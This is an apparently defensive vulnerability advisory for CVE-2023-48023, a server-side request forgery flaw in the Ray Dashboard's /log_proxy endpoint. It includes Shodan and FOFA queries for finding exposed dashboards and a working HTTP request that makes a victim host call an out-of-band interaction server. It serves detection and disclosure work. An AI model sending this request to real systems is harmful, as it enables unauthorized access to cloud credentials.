---
layout: post
cve_id: CVE-2023-48023
title: Anyscale Ray 2.6.3 and 2.8.0 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2023/CVE-2023-48023.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-48023.yaml
snort2_rule: N/A
snort3_rule: N/A
author: cookiehanhoan,harryha
severity: critical
impact: 'The issue is exploitable without authentication and is dependent only on
  network connectivity to the Ray Dashboard port (8265 by default). The vulnerability
  could be exploited to retrieve the highly privileged IAM credentials required by
  Ray from the AWS metadata API. As an impact it is known to affect confidentiality,
  integrity, and availability.

  '
remediation: Update to the latest version
reference:
- https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0
- https://huntr.com/bounties/448bcada-9f6f-442e-8950-79f41efacfed/
- https://security.snyk.io/vuln/SNYK-PYTHON-RAY-6096054
- https://nvd.nist.gov/vuln/detail/CVE-2023-48023
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
  cvss-score: 9.1
  cve-id: CVE-2023-48023
  cwe-id: CWE-441,CWE-918
  epss-score: 0.89186
  epss-percentile: 0.99514
metadata:
  verified: true
  max-request: 1
  vendor: ray_project
  shodan-query:
  - http.favicon.hash:463802404
  - http.html:"ray dashboard"
  product: ray
  fofa-query:
  - icon_hash=463802404
  - body="ray dashboard"
tags:
- cve
- cve2023
- ssrf
- ray
- anyscale
- Anyscale
- vuln
---

## üîç Vulnerability Description
The Ray Dashboard API is affected by a Server-Side Request Forgery (SSRF) vulnerability in the url parameter of the /log_proxy API endpoint. The API does not perform sufficient input validation within the affected parameter and any HTTP or HTTPS URLs are accepted as valid.


## üåê HTTP Request
```nohighlight
GET /log_proxy?url=http://d5irvlhle0o3mv3c2a50stcwh1dra7aed.oast.pro HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:28.0) Gecko/20100101 Firefox/28.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

